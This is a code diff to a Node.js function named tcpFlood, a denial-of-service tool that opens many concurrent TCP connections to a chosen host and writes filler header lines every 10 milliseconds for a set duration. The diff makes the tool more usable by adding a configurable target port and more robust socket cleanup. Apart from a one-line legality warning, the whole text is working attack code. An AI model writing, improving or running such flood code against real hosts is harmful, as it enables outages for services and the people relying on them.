@@ -5,13 +5,19 @@ import net from 'net';
  * Using this function against systems without explicit permission is illegal and unethical.
  *
  * @param {string} target The target hostname or IP address.
+ * @param {number} port The target port. Defaults to 80.
  * @param {number} threads The number of concurrent TCP connections to establish. Defaults to 10.
  * @param {number} duration The duration of the flood in seconds. Defaults to 60.
  */
-async function tcpFlood(target, threads = 10, duration = 60) {
+async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
   if (!target) {
     console.error("Target hostname or IP address is required for TCP flood.");
     return;
+  }
+
+  if (!Number.isInteger(port) || port <= 0 || port > 65535) {
+    console.warn("Port must be a valid integer between 1 and 65535. Using default value of 80.");
+    port = 80;
   }
 
   if (threads <= 0) {
@@ -24,14 +30,14 @@ async function tcpFlood(target, threads = 10, duration = 60) {
     duration = 60;
   }
 
-  console.log(`Starting TCP flood attack on ${target} with ${threads} threads for ${duration} seconds.`);
+  console.log(`Starting TCP flood attack on ${target}:${port} with ${threads} threads for ${duration} seconds.`);
 
   const sockets = [];
 
   for (let i = 0; i < threads; i++) {
     try {
-      const socket = net.createConnection({ host: target, port: 80 }, () => { // Defaulting to port 80.  Allowing specific port config would be ideal.
-        console.log(`Thread ${i + 1}: Connected to ${target}`);
+      const socket = net.createConnection({ host: target, port: port }, () => {
+        console.log(`Thread ${i + 1}: Connected to ${target}:${port}`);
 
         sockets.push(socket);
 
@@ -45,11 +51,15 @@ async function tcpFlood(target, threads = 10, duration = 60) {
         const intervalId = setInterval(() => {
           try {
             //Keep alive
-             socket.write("X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
+            socket.write("X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
           } catch (err) {
             console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
             clearInterval(intervalId);
-            socket.destroy();
+            try {
+              socket.destroy();
+            } catch(e) {
+              console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
+            }
           }
         }, 10);
 
@@ -57,24 +67,37 @@ async function tcpFlood(target, threads = 10, duration = 60) {
         setTimeout(() => {
           console.log(`Thread ${i + 1}: Closing connection after ${duration} seconds.`);
           clearInterval(intervalId);
-          socket.destroy();
-          sockets.splice(sockets.indexOf(socket), 1); // Remove the socket from the array
+          try {
+            socket.destroy();
+          } catch(e) {
+            console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
+          }
+          const index = sockets.indexOf(socket);
+          if (index > -1) {
+            sockets.splice(index, 1);
+          }
         }, duration * 1000);
       });
 
 
       socket.on('error', (err) => {
         console.error(`Thread ${i + 1}: Socket error: ${err.message}`);
-        socket.destroy();
-        if (sockets.includes(socket)) {
-            sockets.splice(sockets.indexOf(socket), 1);
+        try {
+          socket.destroy();
+        } catch(e) {
+          console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
+        }
+        const index = sockets.indexOf(socket);
+        if (index > -1) {
+          sockets.splice(index, 1);
         }
       });
 
       socket.on('close', () => {
         console.log(`Thread ${i + 1}: Connection closed.`);
-        if (sockets.includes(socket)) {
-            sockets.splice(sockets.indexOf(socket), 1);
+        const index = sockets.indexOf(socket);
+        if (index > -1) {
+          sockets.splice(index, 1);
         }
       });
 
@@ -87,12 +110,11 @@ async function tcpFlood(target, threads = 10, duration = 60) {
   setTimeout(() => {
     console.log("Stopping TCP flood.");
     sockets.forEach(socket => {
-        try {
-            socket.destroy();
-        } catch (e) {
-            console.error("Error destroying socket:", e);
-        }
-
+      try {
+        socket.destroy();
+      } catch (e) {
+        console.error("Error destroying socket:", e);
+      }
     });
   }, duration * 1000);
 }
